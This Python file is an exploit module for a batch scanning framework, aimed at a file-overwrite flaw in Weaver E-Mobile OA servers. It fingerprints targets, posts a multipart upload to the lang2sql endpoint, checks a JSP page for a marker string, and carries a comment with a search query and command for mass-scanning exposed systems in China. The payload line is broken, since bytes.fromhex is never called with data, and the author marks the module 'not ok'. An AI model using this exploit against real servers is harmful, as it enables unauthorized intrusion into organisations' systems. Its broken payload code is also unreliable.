# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify, get_eyes_identifier
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# app="泛微-EMobile" && country="CN"
# python3 batch.py -m exploit.scripts.OA.Weaver.E-Mobile.unauth_lang2sql_rce -cs -fs "app=\"泛微-EMobile\" && country=\"CN\""
# not ok

class Script(BaseScript):
    name = 'E-Mobile'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = 'https://cvepush.com/2022/08/01/%e6%b3%9b%e5%be%aeemobile%e6%96%87%e4%bb%b6%e8%a6%86%e7%9b%96%e6%bc%8f%e6%b4%9e-2/'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/emp/lang2sql?client_type=1&lang_tag=1']
        # 相关信息
        self.info = '''泛微EMobile文件覆盖漏洞'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and ('content="weaver e-mobile"' in text or 'window.apiprifix = "/emp";' in text or ('/images/login_logo@2x.png' in text and 'action="/verifylogin.do' in text) or ('e-mobile' in text and 'weaver' in text)):
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryO7Ny5WAA3vZGHdkS', 'Origin': 'null'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = bytes.fromhex
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                url = f'http://{self.target}/monitor/downloadSecurityPackage.jsp' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/monitor/downloadSecurityPackage.jsp'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'test123456' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
